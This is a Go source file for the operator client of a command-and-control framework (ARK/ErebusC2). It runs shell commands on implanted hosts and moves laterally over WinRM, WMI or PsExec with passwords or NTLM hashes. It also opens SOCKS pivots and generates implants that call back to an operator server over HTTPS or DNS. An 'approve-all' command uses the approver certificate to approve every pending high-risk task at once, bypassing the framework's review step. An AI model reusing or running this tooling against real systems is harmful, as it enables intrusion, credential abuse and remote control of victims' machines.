package arkcli

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	pb "github.com/KKingZero/ARK/pkg/pb"
	"github.com/KKingZero/ARK/pkg/preimplant"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/protobuf/proto"
)

// OpOptions configures non-interactive operator commands.
type OpOptions struct {
	Server           string
	CertFile         string
	KeyFile          string
	CAFile           string
	ApproverCertFile string
	ApproverKeyFile  string
}

// RunOp executes a one-shot operator command (sessions|shell|lateral|pending|approve-all).
func RunOp(opts OpOptions, args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: ark op <sessions|shell|lateral|socks|pending|approve-all|generate|register-secret|inbound|help> [args]")
	}
	// Host-local: no teamserver / certs. Same as `ark inbound`.
	if args[0] == "inbound" {
		return preimplant.RunInbound(args[1:])
	}
	if opts.Server == "" {
		opts.Server = "127.0.0.1:50051"
	}
	if opts.CertFile == "" || opts.KeyFile == "" || opts.CAFile == "" {
		c, k, ca := DefaultCertPaths()
		if opts.CertFile == "" {
			opts.CertFile = c
		}
		if opts.KeyFile == "" {
			opts.KeyFile = k
		}
		if opts.CAFile == "" {
			opts.CAFile = ca
		}
	}
	cmd := args[0]
	rest := args[1:]

	switch cmd {
	case "help", "-h", "--help":
		fmt.Print(opHelp)
		return nil
	case "sessions":
		return opSessions(opts)
	case "pending":
		return opPending(opts)
	case "approve-all":
		return opApproveAll(opts)
	case "shell":
		return opShell(opts, rest)
	case "lateral":
		return opLateral(opts, rest)
	case "generate":
		return opGenerate(opts, rest)
	case "register-secret":
		return opRegisterSecret(opts, rest)
	case "socks":
		return opSocks(opts, rest)
	case "replay-clear", "clear-replay":
		return opReplayClear(opts, rest)
	default:
		return fmt.Errorf("unknown op command %q (try: ark op help)", cmd)
	}
}

const opHelp = `ark op — non-interactive operator commands

  ark op sessions
  ark op pending
  ark op approve-all
  ark op shell [--session ID] <command...>
  ark op lateral winrm <target> <command> --user U --domain D (--pass P | --hash H)
  ark op generate --os windows --language c --transport https --callback https://C2:8443 --out implant.exe
  ark op register-secret <implant_id> <secret_hex> [build_id]
  ark op inbound [status|env|drop|through|close|tunnel]  # drop/through need teamserver for generate/socks
  ark op socks start [--port 1080] [--session ID]
  ark op socks stop [--session ID]
  ark op replay-clear <implant_id>   # flush HMAC replay cache after extra PIDs

Uses ~/.ark/certs/operator*.pem by default (except inbound).
Approval commands use ~/.ark/certs/approver*.pem unless overridden.
Flags (before subcommand): -server -cert -key -ca -approver-cert -approver-key

`

func dialOp(server, cert, key, caPath string) (*grpc.ClientConn, error) {
	certPair, err := tls.LoadX509KeyPair(cert, key)
	if err != nil {
		return nil, err
	}
	pem, err := os.ReadFile(caPath)
	if err != nil {
		return nil, err
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(pem) {
		return nil, fmt.Errorf("bad CA file %s", caPath)
	}
	tlsCfg := &tls.Config{
		Certificates: []tls.Certificate{certPair},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS12,
	}
	return grpc.NewClient(server, grpc.WithTransportCredentials(credentials.NewTLS(tlsCfg)))
}

func opSessions(opts OpOptions) error {
	conn, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer conn.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	resp, err := pb.NewErebusC2Client(conn).ListSessions(ctx, &pb.ListSessionsRequest{})
	if err != nil {
		return err
	}
	for _, s := range resp.Sessions {
		fmt.Printf("session=%s implant=%s host=%s user=%s os=%s alive=%v last=%d\n",
			s.SessionId, s.ImplantId, s.Hostname, s.Username, s.Os, s.Alive, s.LastCheckin)
	}
	return nil
}

func opPending(opts OpOptions) error {
	conn, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer conn.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	resp, err := pb.NewErebusC2Client(conn).ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
	if err != nil {
		return err
	}
	for _, a := range resp.Approvals {
		fmt.Printf("id=%s session=%s type=%v risk=%s desc=%s\n",
			a.Id, a.SessionId, a.TaskType, a.RiskLevel, a.TaskDescription)
	}
	return nil
}

func opApproveAll(opts OpOptions) error {
	if opts.ApproverCertFile == "" || opts.ApproverKeyFile == "" {
		ac, ak := DefaultApproverCertPaths()
		if opts.ApproverCertFile == "" {
			opts.ApproverCertFile = ac
		}
		if opts.ApproverKeyFile == "" {
			opts.ApproverKeyFile = ak
		}
	}
	op, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer op.Close()
	ap, err := dialOp(opts.Server, opts.ApproverCertFile, opts.ApproverKeyFile, opts.CAFile)
	if err != nil {
		return fmt.Errorf("approver dial (run: ark certs seats): %w", err)
	}
	defer ap.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	opC := pb.NewErebusC2Client(op)
	apC := pb.NewErebusC2Client(ap)
	pend, err := opC.ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
	if err != nil {
		return err
	}
	for _, a := range pend.Approvals {
		if _, err := apC.Approve(ctx, &pb.ApproveRequest{ApprovalId: a.Id}); err != nil {
			fmt.Fprintf(os.Stderr, "approve %s failed: %v\n", a.Id, err)
			continue
		}
		fmt.Println("approved", a.Id)
	}
	return nil
}

func pickAliveSession(ctx context.Context, c pb.ErebusC2Client, session string) (string, error) {
	if session != "" {
		return session, nil
	}
	resp, err := c.ListSessions(ctx, &pb.ListSessionsRequest{})
	if err != nil {
		return "", err
	}
	for _, s := range resp.Sessions {
		if s.Alive {
			return s.SessionId, nil
		}
	}
	return "", fmt.Errorf("no alive session")
}

func opShell(opts OpOptions, args []string) error {
	session := ""
	cmdParts := args
	if len(args) >= 2 && (args[0] == "--session" || args[0] == "-s") {
		session = args[1]
		cmdParts = args[2:]
	}
	// Allow "shell --session ID -- cmd" and "shell -- cmd"
	if len(cmdParts) > 0 && cmdParts[0] == "--" {
		cmdParts = cmdParts[1:]
	}
	if len(cmdParts) == 0 {
		return fmt.Errorf("usage: ark op shell [--session ID] [--] <command...>")
	}
	command := strings.Join(cmdParts, " ")

	op, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer op.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	opC := pb.NewErebusC2Client(op)

	sid, err := pickAliveSession(ctx, opC, session)
	if err != nil {
		return err
	}
	fmt.Println("using session", sid)

	data, _ := proto.Marshal(&pb.ShellTask{Command: command})
	return executeAndWait(ctx, opC, sid, pb.TaskType_TASK_SHELL, data, func(res *pb.TaskResult) error {
		if res == nil {
			return fmt.Errorf("nil result")
		}
		if res.Error != "" {
			fmt.Fprintf(os.Stderr, "error: %s\n", res.Error)
		}
		sr := &pb.ShellResult{}
		if err := proto.Unmarshal(res.Data, sr); err == nil {
			fmt.Print(sr.Stdout)
			if sr.Stderr != "" {
				fmt.Fprint(os.Stderr, sr.Stderr)
			}
			fmt.Printf("success=%v exit=%d\n", res.Success, sr.ExitCode)
			return nil
		}
		fmt.Printf("success=%v data=%d bytes\n", res.Success, len(res.Data))
		return nil
	})
}

func opSocks(opts OpOptions, args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: ark op socks <start|stop> [--port 1080] [--session ID]")
	}
	action := strings.ToLower(args[0])
	port := uint32(1080)
	session := ""
	for i := 1; i < len(args); i++ {
		switch args[i] {
		case "--port":
			if i+1 >= len(args) {
				return fmt.Errorf("--port requires a value")
			}
			i++
			n, err := strconv.ParseUint(args[i], 10, 32)
			if err != nil || n == 0 {
				return fmt.Errorf("bad --port")
			}
			port = uint32(n)
		case "--session", "-s":
			if i+1 >= len(args) {
				return fmt.Errorf("--session requires a value")
			}
			i++
			session = args[i]
		default:
			return fmt.Errorf("unknown socks flag %q", args[i])
		}
	}
	var tt pb.TaskType
	var data []byte
	switch action {
	case "start":
		tt = pb.TaskType_TASK_SOCKS_START
		var err error
		data, err = proto.Marshal(&pb.SocksStartTask{Port: port})
		if err != nil {
			return err
		}
	case "stop":
		tt = pb.TaskType_TASK_SOCKS_STOP
		var err error
		data, err = proto.Marshal(&pb.SocksStopTask{})
		if err != nil {
			return err
		}
	default:
		return fmt.Errorf("usage: ark op socks <start|stop> [--port 1080] [--session ID]")
	}

	op, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer op.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	opC := pb.NewErebusC2Client(op)
	sid, err := pickAliveSession(ctx, opC, session)
	if err != nil {
		return err
	}
	fmt.Println("using session", sid)
	return executeAndWait(ctx, opC, sid, tt, data, func(res *pb.TaskResult) error {
		if res == nil {
			return fmt.Errorf("nil result")
		}
		if !res.Success {
			return fmt.Errorf("socks %s: %s", action, res.Error)
		}
		if action == "start" {
			var sr pb.SocksStartResult
			if proto.Unmarshal(res.Data, &sr) == nil {
				fmt.Printf("socks start success=%v port=%d\n", sr.Success, sr.Port)
				return nil
			}
		}
		fmt.Printf("socks %s success=%v\n", action, res.Success)
		return nil
	})
}

func opReplayClear(opts OpOptions, args []string) error {
	if len(args) < 1 || strings.TrimSpace(args[0]) == "" {
		return fmt.Errorf("usage: ark op replay-clear <implant_id>")
	}
	id := strings.TrimSpace(args[0])
	conn, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer conn.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	resp, err := pb.NewErebusC2Client(conn).ClearReplay(ctx, &pb.ClearReplayRequest{ImplantId: id})
	if err != nil {
		return err
	}
	if !resp.GetSuccess() {
		return fmt.Errorf("replay-clear: %s", resp.GetError())
	}
	fmt.Printf("replay-clear implant=%s cleared=%d\n", id, resp.GetCleared())
	return nil
}

func opLateral(opts OpOptions, args []string) error {
	// lateral winrm <target> <command...> --user --domain --pass|--hash [--session]
	if len(args) < 3 {
		return fmt.Errorf("usage: ark op lateral winrm <target> <command> --user U --domain D (--pass P|--hash H) [--session ID]")
	}
	method := args[0]
	target := args[1]
	rest := args[2:]

	var commandParts []string
	flags := map[string]string{}
	for i := 0; i < len(rest); i++ {
		a := rest[i]
		if strings.HasPrefix(a, "--") {
			key := a
			val := ""
			if i+1 < len(rest) && !strings.HasPrefix(rest[i+1], "--") {
				i++
				val = rest[i]
			}
			flags[key] = val
			continue
		}
		commandParts = append(commandParts, a)
	}
	command := strings.Join(commandParts, " ")
	if command == "" {
		return fmt.Errorf("command required")
	}
	if method != "winrm" && method != "wmi" && method != "psexec" {
		return fmt.Errorf("unsupported method %q", method)
	}

	cfg := &pb.LateralMoveConfig{
		Method:   method,
		Target:   target,
		Command:  command,
		Username: flags["--user"],
		Password: flags["--pass"],
		Domain:   flags["--domain"],
		NtlmHash: flags["--hash"],
	}
	if cfg.Username == "" {
		return fmt.Errorf("--user required")
	}
	if cfg.Password == "" && cfg.NtlmHash == "" {
		return fmt.Errorf("--pass or --hash required")
	}

	op, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer op.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 180*time.Second)
	defer cancel()
	opC := pb.NewErebusC2Client(op)

	sid, err := pickAliveSession(ctx, opC, flags["--session"])
	if err != nil {
		return err
	}
	fmt.Println("using session", sid)

	data, err := proto.Marshal(cfg)
	if err != nil {
		return err
	}
	return executeAndWait(ctx, opC, sid, pb.TaskType_TASK_LATERAL_MOVE, data, func(res *pb.TaskResult) error {
		if res == nil {
			return fmt.Errorf("nil result")
		}
		fmt.Printf("success=%v err=%q\n", res.Success, res.Error)
		var lr pb.LateralMoveResult
		if err := proto.Unmarshal(res.Data, &lr); err == nil {
			fmt.Printf("method=%s target=%s success=%v\n--- output ---\n%s\n", lr.Method, lr.Target, lr.Success, lr.Output)
			return nil
		}
		fmt.Printf("raw data %d bytes\n", len(res.Data))
		return nil
	})
}

func executeAndWait(
	ctx context.Context,
	opC pb.ErebusC2Client,
	session string,
	tt pb.TaskType,
	data []byte,
	handle func(*pb.TaskResult) error,
) error {
	resp, err := opC.ExecuteTask(ctx, &pb.ExecuteTaskRequest{
		SessionId: session,
		TaskType:  tt,
		Data:      data,
		Wait:      true,
		TimeoutMs: 120000,
	})
	if err != nil {
		return err
	}
	return handle(resp.Result)
}

func opGenerate(opts OpOptions, args []string) error {
	osName := "windows"
	arch := "amd64"
	format := "exe"
	sleepMs := int64(500)
	jitter := int32(10)
	language := "c"
	transport := "https"
	cdnDomain := ""
	dnsDomain := ""
	dnsServer := ""
	outPath := ""
	var callbacks []string
	for i := 0; i < len(args); i++ {
		need := func() (string, error) {
			if i+1 >= len(args) {
				return "", fmt.Errorf("%s requires a value", args[i])
			}
			i++
			return args[i], nil
		}
		switch args[i] {
		case "--os":
			v, err := need()
			if err != nil {
				return err
			}
			osName = v
		case "--arch":
			v, err := need()
			if err != nil {
				return err
			}
			arch = v
		case "--format":
			v, err := need()
			if err != nil {
				return err
			}
			format = v
		case "--sleep":
			v, err := need()
			if err != nil {
				return err
			}
			ms, err := strconv.ParseInt(v, 10, 64)
			if err != nil {
				return fmt.Errorf("--sleep: %w", err)
			}
			sleepMs = ms
		case "--jitter":
			v, err := need()
			if err != nil {
				return err
			}
			j, err := strconv.ParseInt(v, 10, 32)
			if err != nil {
				return fmt.Errorf("--jitter: %w", err)
			}
			jitter = int32(j)
		case "--callback":
			v, err := need()
			if err != nil {
				return err
			}
			callbacks = append(callbacks, v)
		case "--transport":
			v, err := need()
			if err != nil {
				return err
			}
			transport = strings.ToLower(v)
		case "--cdn-domain":
			v, err := need()
			if err != nil {
				return err
			}
			cdnDomain = v
		case "--dns-domain":
			v, err := need()
			if err != nil {
				return err
			}
			dnsDomain = v
		case "--dns-server":
			v, err := need()
			if err != nil {
				return err
			}
			dnsServer = v
		case "--language", "--lang":
			v, err := need()
			if err != nil {
				return err
			}
			language = v
		case "--out", "-o":
			v, err := need()
			if err != nil {
				return err
			}
			outPath = v
		default:
			return fmt.Errorf("unknown generate flag %q", args[i])
		}
	}
	if len(callbacks) == 0 {
		return fmt.Errorf("--callback URL required")
	}
	if transport != "https" && transport != "dns" {
		return fmt.Errorf("--transport must be https or dns")
	}
	if transport == "dns" && dnsDomain == "" {
		return fmt.Errorf("--dns-domain required when --transport dns")
	}
	if transport != "dns" && (dnsDomain != "" || dnsServer != "") {
		return fmt.Errorf("--dns-domain/--dns-server require --transport dns")
	}
	conn, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer conn.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Minute)
	defer cancel()
	fmt.Printf("Building implant language=%s os=%s arch=%s format=%s sleep=%dms …\n",
		language, osName, arch, format, sleepMs)
	resp, err := pb.NewErebusC2Client(conn).GenerateImplant(ctx, &pb.GenerateImplantRequest{
		Os:        osName,
		Arch:      arch,
		Transport: transport,
		Callbacks: callbacks,
		SleepMs:   sleepMs,
		JitterPct: jitter,
		Format:    format,
		Language:  language,
		CdnDomain: cdnDomain,
		DnsDomain: dnsDomain,
		DnsServer: dnsServer,
	})
	if err != nil {
		return err
	}
	if !resp.Success {
		return fmt.Errorf("generate failed: %s", resp.Error)
	}
	if outPath == "" {
		outPath = resp.Filename
		if outPath == "" {
			outPath = "implant.bin"
		}
	}
	if err := os.WriteFile(outPath, resp.Binary, 0o750); err != nil {
		return err
	}
	fmt.Printf("OK build_id=%s format=%s size=%d bytes → %s\n",
		resp.BuildId, resp.Format, len(resp.Binary), outPath)
	return nil
}

func opRegisterSecret(opts OpOptions, args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: ark op register-secret <implant_id> <secret_hex> [build_id]")
	}
	buildID := "manual"
	if len(args) >= 3 {
		buildID = args[2]
	}
	conn, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer conn.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	resp, err := pb.NewErebusC2Client(conn).RegisterImplantSecret(ctx, &pb.RegisterImplantSecretRequest{
		ImplantId: args[0],
		SecretHex: args[1],
		BuildId:   buildID,
	})
	if err != nil {
		return err
	}
	if !resp.Success {
		return fmt.Errorf("%s", resp.Error)
	}
	fmt.Printf("Registered sealed secret for implant %s (build_id=%s)\n", args[0], buildID)
	return nil
}

// RunCertsSeats ensures operator + approver client certs exist under dataDir.
func RunCertsSeats(dataDir string) error {
	if dataDir == "" {
		dataDir = DataDir()
	}
	s, err := EnsureSeatCerts(dataDir)
	if err != nil {
		return err
	}
	fmt.Printf("operator cert: %s\n", s.OperatorCert)
	fmt.Printf("approver cert: %s\n", s.ApproverCert)
	fmt.Printf("ca:            %s\n", s.CA)
	fmt.Printf("cert dir:      %s\n", filepath.Dir(s.OperatorCert))
	return nil
}
